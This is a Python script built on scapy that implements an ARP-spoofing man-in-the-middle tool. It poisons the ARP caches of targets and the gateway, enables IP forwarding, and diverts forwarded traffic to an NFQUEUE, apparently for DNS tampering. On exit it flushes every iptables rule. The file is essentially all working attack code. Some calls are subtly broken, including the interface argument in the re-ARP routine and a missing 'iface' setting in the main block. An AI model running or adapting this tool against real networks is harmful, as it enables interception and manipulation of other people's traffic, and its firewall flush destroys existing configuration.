#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'

import sys
import os
import threading
import logging
import queue
import time
from scapy.all import *

import utils

logger = logging.getLogger("ARPSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# DO NOT CHANGE THIS VALUES! USE CONFIG INSTEAD!
DEFAULT_GATEWAY = '192.168.0.1'
DEFAULT_NETWORK = "192.168.0.0/24"
REARP_VAL = 10
INTERVAL = 10

# global variable
counter = 0

# _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
# _iptablesr_ =  "iptables -I FORWARD -j NFQUEUE --queue-num 1"
_iptablesr_ = "iptables -I FORWARD -d 192.168.88.0/24 -j NFQUEUE --queue-num 1"
# _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
_iptablesrm_ = "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X"


class ARPspoofer(threading.Thread):
    """
    ARPspoofer class is used to provide ARP spoofing capability
    ARPspoofer can work in two modes. One mode provides ability
    to spoof ARP responses only for a specific target. Another
    option is to spoof whole ARP traffic in the network.
    """

    def __init__(self, event, queue, config={}):
        """"""
        threading.Thread.__init__(self)
        self.event = event
        self.gw = None
        self.network = None
        self.delay = None
        self.interface = None
        self.targets = []
        self.ip_mac = {}
        self.myself = None
        self.queue = queue
        self.iface_mac = None
        self.iface = None
        self.rearp = True

        logger.info("Initializing ARPspoofer...")
        if os.getuid():
            logger.error("Run me as root!")
            sys.exit(-1)

        self.__config_load(config)
        logger.warning("Used kernel ipv4 forwarding feature.")

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        logger.info("Kernel IPv4 forwarding enabled")

        iptablesr = _iptablesr_.format(self.network)

        logger.debug('Inserting iptables rules: {}'.format(iptablesr))
        try:
            os.system(iptablesr)
        except OSError:
            logger.critical('Cannot execute iptables rules!')
            sys.exit(-1)

        logger.debug('iptables rules inserted!')


    def __config_load(self, config={}):
        """
        Loading config from config dict
        :param config: dictionary of settings
        :return: None
        """
        logger.info("Loading config...")
        print(config)

        self.gw = config.get('gateway', None)

        if not self.gw:
            logger.critical("IP of gateway not specified! Using default one: {}".format(DEFAULT_GATEWAY))
            self.gw = DEFAULT_GATEWAY

        mac = utils.arpping(self.gw)

        while mac is None:
            logger.debug('Cannot obtain MAC addr of the gateway. Make sure {} is correct!'.format(self.gw))
            mac = utils.arpping(self.gw)

        self.ip_mac[self.gw] = mac
        logger.debug('Gateway MAC addr: {}'.format(mac))

        self.network = config.get('network', None)

        if self.network is None:
            logger.debug('Using default network! {}'.format(DEFAULT_NETWORK))
            self.network = DEFAULT_NETWORK

        self.targets = config.get('target', None)

        if not self.targets:
            logger.debug('No explicit targets found! Calculating from the net!')
            self.targets = utils.get_hosts(self.network)

        logger.debug('Targets: {}'.format(self.targets))

        for t in self.targets:
            mac = utils.arpping(t)
            cc = 0

            while mac is None:
                logger.debug('Target {} has MAC: {}'.format(t, mac))
                cc += 1
                mac = utils.arpping(t)

                if cc > 3 and mac is None:
                    logger.critical('Cannot determine MAC addr of {}'.format(t))
                    raise ValueError('Check if {} addr is correct!'.format(t))

            if mac is not None:
                self.ip_mac[t] = mac

        self.iface = config['iface']
        self.iface_mac = utils.getHwAddr(self.iface)

    def rearping(self):
        """
        reARPing method restores correct ARP settings used by target hosts. Messages are sent multiple times to ensure
        that changes are spotted and applied in ARP tables
        :return: None
        """
        logger.debug('reARPing session started!')
        cont = True

        for i in range(REARP_VAL):
            logger.debug('reARPing iteration: {}'.format(i))
            for ip, mac in self.ip_mac.items():
                if self.event.is_set():
                    cont = False
                    break

                vb = 0 if i % 2 == 0 else 1
                logger.debug('{} is at {} send to {} {}'.format(ip, mac, self.gw, self.ip_mac[self.gw]))
                ARPspoofer.__send_ARP(ip, mac, self.gw, self.ip_mac[self.gw], vb)
                logger.debug('{} is at {} send to {} {}'.format(self.gw, self.ip_mac[self.gw], ip, mac))
                ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, mac, vb)

            if not cont:
                logger.debug('reARPing canceled!')
                break

        logger.debug('reARPing finished...')

    def __spoof(self):
        """
        Main spoofing function. Iterates through the targets lists and sends two packets each iteration.
        ARP response to target and gateway, putting this machine in the middle. Basics of MITM attack via
        ARP spoofing
        :return: None
        """
        global counter
        for ip in self.targets:
            if ip == self.gw:
                continue

            mac = self.ip_mac[ip]
            # Ether(dst=V_MAC) / ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
            # pkt = Ether(dst=mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
            # send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
            # send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
            # pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac,
            #                                                               hwsrc=self.iface_mac)
            # sendp(pkt, verbose=0)
            vb = 1 if counter == INTERVAL else 0
            ARPspoofer.__send_ARP(ip, mac, self.gw, self.iface_mac, self.iface, vb)

            if vb:
                logger.debug('Sending ARP spoof message! Target: {}'.format(ip))

            # p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
            # pkt = Ether(dst=self.ip_mac[self.gw]) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
            # pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=self.gw, psrc=ip,
            #                                                               hwdst="ff:ff:ff:ff:ff:ff")  # self.ip_mac[self.gw])
            # sendp(pkt, verbose=0)
            ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, self.iface_mac, self.iface, vb)

            if vb:
                logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))

            time.sleep(1.0)

    @staticmethod
    def __send_ARP(destination_ip, destination_mac, source_ip, source_mac, interface, verbose=0):
        """
        Helper static method wrapping creating ARP packet and sendp function from scapy module.
        :param destination_ip: - IPv4 of a destination host pdst param
        :param destination_mac: - MAC of a destination host hwdst param
        :param source_ip: string - IPv4 of a source host psrc param
        :param source_mac: strin - MAC of a source host hwsrc param
        :return:
        """

        if verbose:
            logger.debug(
                'Creating packet ARP: ipsrc: {} hwsrc: {} ipdst: {} hwdst: {}'.format(
                    source_ip, source_mac, destination_ip, destination_mac)
            )

        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                     psrc=source_ip, hwsrc=source_mac)

        if verbose:
            logger.debug('Packet created: {}'.format(pkt.show(dump=True)))

        sendp(pkt, iface=interface, verbose=0)

    def __execute_cmd(self, cmd):
        """
        Helper function executing commands. Creates changes runtime.
        :param cmd: touple of arguments
        :return: None
        """
        if not isinstance(cmd, list):
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) < 1:
            logger.critical('Unknown command! {}'.format(cmd))

        elif len(cmd) == 1:

            if cmd[0].strip() == 'p':
                logger.debug('Pausing...')

            elif cmd[0].strip() == 'r':
                logger.debug('Running...')

            else:
                logger.critical('Unknown command!')

        elif len(cmd) == 2:

            if cmd[0].strip() == 'a':
                logger.debug('Adding entry {} to target queue!'.format(cmd[1]))
                self.targets.append(cmd[1])

            elif cmd[0].strip() == 'd':
                logger.debug('Removing entry {} from target queue!'.format(cmd[1]))

                try:
                    self.targets.remove(cmd[1])

                except ValueError:
                    logger.warning('Input: {} not in target list! Cannot remove!'.format(cmd[1]))

        else:
            logger.critical('Unknown command!')

    def __spoof_loop(self):
        """
        Main spoof loop function. Invokes spoofing function until threading-end event is set.
        It also resolves IP addresses to MAC using arpping from utils.
        :return:
        """
        global counter
        try:
            while not self.event.is_set():
                if counter == INTERVAL:
                    logger.debug('Iterating...')

                else:
                    counter += 1

                while not self.queue.empty() and not self.event.is_set():
                    cmd = self.queue.get()
                    logger.debug('New command: {}'.format(cmd))
                    self.__execute_cmd(cmd)

                for t in self.targets:
                    if t not in self.ip_mac:
                        mac = utils.arpping(t)
                        self.ip_mac[t] = mac

                self.__spoof()

                time.sleep(0.10)

                if counter == INTERVAL:
                    counter = 0

        except KeyboardInterrupt:
            logger.info('Exiting by KeyboardInterrupt')

        finally:
            print("arpspoofer exiting!")

        if self.rearp:
            print("reARPing the network!")
            logger.debug('reARPing the network')

            self.rearping()

            logger.debug('reARPing finished!')

        iptablesrm = _iptablesrm_.format(self.network)
        try:
            logger.debug('Reverting iptables rules!')
            os.system(iptablesrm)
            logger.debug('Rules reverted!')
        except OSError:
            logger.critical('Cannot revert iptables rules!')
            sys.exit(-1)

    def run(self):
        """
        Run method overrides threading.run method for parallel execution.
        :return: None
        """
        self.__spoof_loop()
        try:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        except AttributeError:
            pass
        return


if __name__ == '__main__':
    q = queue.Queue()
    q.put(['a', '192.168.0.11'])
    e = threading.Event()
    AS = ARPspoofer(event=e, queue=q)
    AS.run()
    logger.critical('Quiting arpspoofer')
